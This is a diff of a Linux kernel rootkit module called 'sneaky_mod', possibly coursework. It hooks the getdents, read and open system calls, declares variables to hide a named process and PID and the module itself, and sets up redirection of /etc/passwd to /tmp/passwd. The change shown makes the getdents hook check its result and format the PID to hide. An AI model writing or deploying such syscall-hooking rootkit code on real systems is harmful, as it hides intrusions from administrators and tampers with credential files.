@@ -81,11 +81,11 @@ asmlinkage int (*original_getdents_call)(unsigned int fd,
 // getdents
 char sneaky_pid_str[BUFFER_LEN];
 const char *sneaky_process = "sneaky_process";
+int nread = -1;
 
 // open
 const char *passwd_path = "/etc/passwd";
 const char *tmp_path = "/tmp/passwd";
-char new_pathname[BUFFER_LEN];
 
 // read
 const char *sneaky_mod = "sneaky_mod";
@@ -112,7 +112,14 @@ asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
   printk_ratelimited(KERN_INFO "Sneaky: getdents syscall\n");
-  int nread = original_getdents_call(fd, dirp, count);
+  nread = original_getdents_call(fd, dirp, count);
+  if (nread <= 0) {
+    return nread;
+  }
+  memset(sneaky_pid_str, 0, BUFFER_LEN);
+  snprintf(sneaky_pid_str, BUFFER_LEN, "%d", sneaky_pid);
+  printk_ratelimited(KERN_INFO "getdents: sneaky_pid_str = %s\n",
+                     sneaky_pid_str);
   return nread;
 }
 
